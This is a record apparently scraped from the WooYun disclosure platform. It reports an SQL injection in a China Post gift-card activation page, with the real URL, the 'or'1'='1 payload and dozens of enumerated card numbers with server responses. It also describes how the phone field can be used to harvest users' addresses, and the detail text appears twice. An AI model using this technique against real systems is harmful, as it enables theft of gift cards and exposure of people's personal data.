{"id": 45896, "wybug_id": "wooyun-2015-093627", "wybug_title": "中国邮政某公司礼品卡系统sql注入外加遍历用户信息", "wybug_corp": "中国邮政集团公司信息技术局", "wybug_author": "浮世浮城", "wybug_date": "2015-01-24 12:34", "wybug_open_date": "2015-03-10 12:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向公众公开  简要描述： 我这里只测试了000到999这卡是1月31日前面要激活的不激活过期我看了一下大概700多份没激活...要不给我来一份... 详细说明：  单位发了2张卡让我们1月31号之前激活领取我就寻思着试试这里我测试的号码是2种第一种海鲜组合320150804***价值300第二种坚果组合320150904***价值350问题url:http://www.zjpost.com/gift/tbCardActive.action\n\n礼品卡激活这里先随便填写密码乱输入看看提示 密码不匹配\n\n那我们在号码后面加上'or'1'='1试试 提示已经激活\n\n那我在换个号码后面加上'or'1'='1试试 可以进去 可以提交资料\n\n也就是说我要是填写了地址电话什么的 就意味着拿着999的这张卡的人就不能激活了. 赶紧做个字典用神器分别跑一下先跑海鲜的000-999的人 189个人领取了\n\n798个人还没有领取 1月31就结束了 你们不领取要不小弟帮你们代劳激活一下？\n\n在跑一下坚果的人同样 000-999285个人领取了\n\n710个小伙伴还没领取\n\n随机测试几个 坚果的领取的320150904359'or'1'='1\t200\tfalse\tfalse\t7104\t320150904361'or'1'='1\t200\tfalse\tfalse\t7104\t320150904358'or'1'='1\t200\tfalse\tfalse\t7104\t320150904363'or'1'='1\t200\tfalse\tfalse\t7104\t320150904350'or'1'='1\t200\tfalse\tfalse\t7104\t320150904365'or'1'='1\t200\tfalse\tfalse\t7104\t320150904353'or'1'='1\t200\tfalse\tfalse\t7104\t320150904362'or'1'='1\t200\tfalse\tfalse\t7104\t320150904367'or'1'='1\t200\tfalse\tfalse\t7104\t320150904369'or'1'='1\t200\tfalse\tfalse\t7104\t320150904360'or'1'='1\t200\tfalse\tfalse\t7104\t320150904371'or'1'='1\t200\tfalse\tfalse\t7104\t320150904372'or'1'='1\t200\tfalse\tfalse\t7104\t320150904373'or'1'='1\t200\tfalse\tfalse\t7104\t320150904368'or'1'='1\t200\tfalse\tfalse\t7104\t320150904376'or'1'='1\t200\tfalse\tfalse\t7104\t320150904379'or'1'='1\t200\tfalse\tfalse\t7104\t320150904364'or'1'='1\t200\tfalse\tfalse\t7104\t320150904370'or'1'='1\t200\tfalse\tfalse\t7104\t320150904378'or'1'='1\t200\tfalse\tfalse\t7104\t320150904381'or'1'='1\t200\tfalse\tfalse\t7104\t320150904382'or'1'='1\t200\tfalse\tfalse\t7104\t320150904383'or'1'='1\t200\tfalse\tfalse\t7104\t320150904386'or'1'='1\t200\tfalse\tfalse\t7104\t320150904385'or'1'='1\t200\tfalse\tfalse\t7104\t320150904389'or'1'='1\t200\tfalse\tfalse\t7104\t320150904387'or'1'='1\t200\tfalse\tfalse\t7104\t320150904380'or'1'='1\t200\tfalse\tfalse\t7104\t320150904388'or'1'='1\t200\tfalse\tfalse\t7104\t320150904393'or'1'='1\t200\tfalse\tfalse\t7104\t320150904384'or'1'='1\t200\tfalse\tfalse\t7104\t320150904396'or'1'='1\t200\tfalse\tfalse\t7104\t320150904394'or'1'='1\t200\tfalse\tfalse\t7104\t320150904397'or'1'='1\t200\tfalse\tfalse\t7104\t320150904399'or'1'='1\t200\tfalse\tfalse\t7104\t320150904398'or'1'='1\t200\tfalse\tfalse\t7104\t320150904391'or'1'='1\t200\tfalse\tfalse\t7104\t没有领取的320150904536'or'1'='1\t200\tfalse\tfalse\t12957\t320150904537'or'1'='1\t200\tfalse\tfalse\t12957\t320150904538'or'1'='1\t200\tfalse\tfalse\t12957\t320150904474'or'1'='1\t200\tfalse\tfalse\t12957\t320150904539'or'1'='1\t200\tfalse\tfalse\t12957\t320150904541'or'1'='1\t200\tfalse\tfalse\t12957\t320150904542'or'1'='1\t200\tfalse\tfalse\t12957\t320150904544'or'1'='1\t200\tfalse\tfalse\t12957\t320150904545'or'1'='1\t200\tfalse\tfalse\t12957\t320150904546'or'1'='1\t200\tfalse\tfalse\t12957\t320150904547'or'1'='1\t200\tfalse\tfalse\t12957\t320150904548'or'1'='1\t200\tfalse\tfalse\t12957\t320150904540'or'1'='1\t200\tfalse\tfalse\t12957\t320150904530'or'1'='1\t200\tfalse\tfalse\t12957\t320150904551'or'1'='1\t200\tfalse\tfalse\t12957\t320150904552'or'1'='1\t200\tfalse\tfalse\t12957\t320150904549'or'1'='1\t200\tfalse\tfalse\t12957\t320150904554'or'1'='1\t200\tfalse\tfalse\t12957\t320150904553'or'1'='1\t200\tfalse\tfalse\t12957\t320150904555'or'1'='1\t200\tfalse\tfalse\t12957\t320150904556'or'1'='1\t200\tfalse\tfalse\t12957\t320150904557'or'1'='1\t200\tfalse\tfalse\t12957\t320150904559'or'1'='1\t200\tfalse\tfalse\t12957\t320150904561'or'1'='1\t200\tfalse\tfalse\t12957\t320150904550'or'1'='1\t200\tfalse\tfalse\t12957\t320150904562'or'1'='1\t200\tfalse\tfalse\t12957\t320150904558'or'1'='1\t200\tfalse\tfalse\t12957\t320150904543'or'1'='1\t200\tfalse\tfalse\t12957\t320150904563'or'1'='1\t200\tfalse\tfalse\t12957\t320150904564'or'1'='1\t200\tfalse\tfalse\t12957\t320150904565'or'1'='1\t200\tfalse\tfalse\t12957\t320150904567'or'1'='1\t200\tfalse\tfalse\t12957\t320150904568'or'1'='1\t200\tfalse\tfalse\t12957\t320150904569'or'1'='1\t200\tfalse\tfalse\t12957\t320150904560'or'1'='1\t200\tfalse\tfalse\t12957\t320150904571'or'1'='1\t200\tfalse\tfalse\t12957\t320150904574'or'1'='1\t200\tfalse\tfalse\t12957\t全部复制出来就这个都要57页 厂商有兴趣可以问我拿 你们可以测试一下是不是没有领取的或者已经领取的 你们后台一查就知道接下来是遍历用户信息了我发现只要号码在你们数据里面填写过 就会直接被记录 也就是我输入的号码只要是你们里面有的 就自己会跳出地址测试\n\n换个号码\n\n貌似这里也有注入 输入1'or'1'='1也会跳出一个地址\n\n抓包看一下 原来在手机这里输入后自动会跳转一下 也就是说 我只要导入全省的手机号码 就能把数据库里面有的手机对应的地址全部遍历出来\n\n   漏洞证明：  单位发了2张卡让我们1月31号之前激活领取我就寻思着试试这里我测试的号码是2种第一种海鲜组合320150804***价值300第二种坚果组合320150904***价值350问题url:http://www.zjpost.com/gift/tbCardActive.action\n\n礼品卡激活这里先随便填写密码乱输入看看提示 密码不匹配\n\n那我们在号码后面加上'or'1'='1试试 提示已经激活\n\n那我在换个号码后面加上'or'1'='1试试 可以进去 可以提交资料\n\n也就是说我要是填写了地址电话什么的 就意味着拿着999的这张卡的人就不能激活了. 赶紧做个字典用神器分别跑一下先跑海鲜的000-999的人 189个人领取了\n\n798个人还没有领取 1月31就结束了 你们不领取要不小弟帮你们代劳激活一下？\n\n在跑一下坚果的人同样 000-999285个人领取了\n\n710个小伙伴还没领取\n\n随机测试几个 坚果的领取的320150904359'or'1'='1\t200\tfalse\tfalse\t7104\t320150904361'or'1'='1\t200\tfalse\tfalse\t7104\t320150904358'or'1'='1\t200\tfalse\tfalse\t7104\t320150904363'or'1'='1\t200\tfalse\tfalse\t7104\t320150904350'or'1'='1\t200\tfalse\tfalse\t7104\t320150904365'or'1'='1\t200\tfalse\tfalse\t7104\t320150904353'or'1'='1\t200\tfalse\tfalse\t7104\t320150904362'or'1'='1\t200\tfalse\tfalse\t7104\t320150904367'or'1'='1\t200\tfalse\tfalse\t7104\t320150904369'or'1'='1\t200\tfalse\tfalse\t7104\t320150904360'or'1'='1\t200\tfalse\tfalse\t7104\t320150904371'or'1'='1\t200\tfalse\tfalse\t7104\t320150904372'or'1'='1\t200\tfalse\tfalse\t7104\t320150904373'or'1'='1\t200\tfalse\tfalse\t7104\t320150904368'or'1'='1\t200\tfalse\tfalse\t7104\t320150904376'or'1'='1\t200\tfalse\tfalse\t7104\t320150904379'or'1'='1\t200\tfalse\tfalse\t7104\t320150904364'or'1'='1\t200\tfalse\tfalse\t7104\t320150904370'or'1'='1\t200\tfalse\tfalse\t7104\t320150904378'or'1'='1\t200\tfalse\tfalse\t7104\t320150904381'or'1'='1\t200\tfalse\tfalse\t7104\t320150904382'or'1'='1\t200\tfalse\tfalse\t7104\t320150904383'or'1'='1\t200\tfalse\tfalse\t7104\t320150904386'or'1'='1\t200\tfalse\tfalse\t7104\t320150904385'or'1'='1\t200\tfalse\tfalse\t7104\t320150904389'or'1'='1\t200\tfalse\tfalse\t7104\t320150904387'or'1'='1\t200\tfalse\tfalse\t7104\t320150904380'or'1'='1\t200\tfalse\tfalse\t7104\t320150904388'or'1'='1\t200\tfalse\tfalse\t7104\t320150904393'or'1'='1\t200\tfalse\tfalse\t7104\t320150904384'or'1'='1\t200\tfalse\tfalse\t7104\t320150904396'or'1'='1\t200\tfalse\tfalse\t7104\t320150904394'or'1'='1\t200\tfalse\tfalse\t7104\t320150904397'or'1'='1\t200\tfalse\tfalse\t7104\t320150904399'or'1'='1\t200\tfalse\tfalse\t7104\t320150904398'or'1'='1\t200\tfalse\tfalse\t7104\t320150904391'or'1'='1\t200\tfalse\tfalse\t7104\t没有领取的320150904536'or'1'='1\t200\tfalse\tfalse\t12957\t320150904537'or'1'='1\t200\tfalse\tfalse\t12957\t320150904538'or'1'='1\t200\tfalse\tfalse\t12957\t320150904474'or'1'='1\t200\tfalse\tfalse\t12957\t320150904539'or'1'='1\t200\tfalse\tfalse\t12957\t320150904541'or'1'='1\t200\tfalse\tfalse\t12957\t320150904542'or'1'='1\t200\tfalse\tfalse\t12957\t320150904544'or'1'='1\t200\tfalse\tfalse\t12957\t320150904545'or'1'='1\t200\tfalse\tfalse\t12957\t320150904546'or'1'='1\t200\tfalse\tfalse\t12957\t320150904547'or'1'='1\t200\tfalse\tfalse\t12957\t320150904548'or'1'='1\t200\tfalse\tfalse\t12957\t320150904540'or'1'='1\t200\tfalse\tfalse\t12957\t320150904530'or'1'='1\t200\tfalse\tfalse\t12957\t320150904551'or'1'='1\t200\tfalse\tfalse\t12957\t320150904552'or'1'='1\t200\tfalse\tfalse\t12957\t320150904549'or'1'='1\t200\tfalse\tfalse\t12957\t320150904554'or'1'='1\t200\tfalse\tfalse\t12957\t320150904553'or'1'='1\t200\tfalse\tfalse\t12957\t320150904555'or'1'='1\t200\tfalse\tfalse\t12957\t320150904556'or'1'='1\t200\tfalse\tfalse\t12957\t320150904557'or'1'='1\t200\tfalse\tfalse\t12957\t320150904559'or'1'='1\t200\tfalse\tfalse\t12957\t320150904561'or'1'='1\t200\tfalse\tfalse\t12957\t320150904550'or'1'='1\t200\tfalse\tfalse\t12957\t320150904562'or'1'='1\t200\tfalse\tfalse\t12957\t320150904558'or'1'='1\t200\tfalse\tfalse\t12957\t320150904543'or'1'='1\t200\tfalse\tfalse\t12957\t320150904563'or'1'='1\t200\tfalse\tfalse\t12957\t320150904564'or'1'='1\t200\tfalse\tfalse\t12957\t320150904565'or'1'='1\t200\tfalse\tfalse\t12957\t320150904567'or'1'='1\t200\tfalse\tfalse\t12957\t320150904568'or'1'='1\t200\tfalse\tfalse\t12957\t320150904569'or'1'='1\t200\tfalse\tfalse\t12957\t320150904560'or'1'='1\t200\tfalse\tfalse\t12957\t320150904571'or'1'='1\t200\tfalse\tfalse\t12957\t320150904574'or'1'='1\t200\tfalse\tfalse\t12957\t全部复制出来就这个都要57页 厂商有兴趣可以问我拿 你们可以测试一下是不是没有领取的或者已经领取的 你们后台一查就知道接下来是遍历用户信息了我发现只要号码在你们数据里面填写过 就会直接被记录 也就是我输入的号码只要是你们里面有的 就自己会跳出地址测试\n\n换个号码\n\n貌似这里也有注入 输入1'or'1'='1也会跳出一个地址\n\n抓包看一下 原来在手机这里输入后自动会跳转一下 也就是说 我只要导入全省的手机号码 就能把数据库里面有的手机对应的地址全部遍历出来\n\n   修复方案：  修复   版权声明：转载请注明来源 浮世浮城@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-24 14:37 厂商回复： 谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-24 14:04 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  唉呀,大牛    \n     2015-01-24 15:50 |    \t\t浮世浮城 \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:60        | 我存于这俗世烟火的浮世，我爱这时光倒影的...)\t\t \n  @B1acken 求不嘲讽啊 不过走大厂商确实爽    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}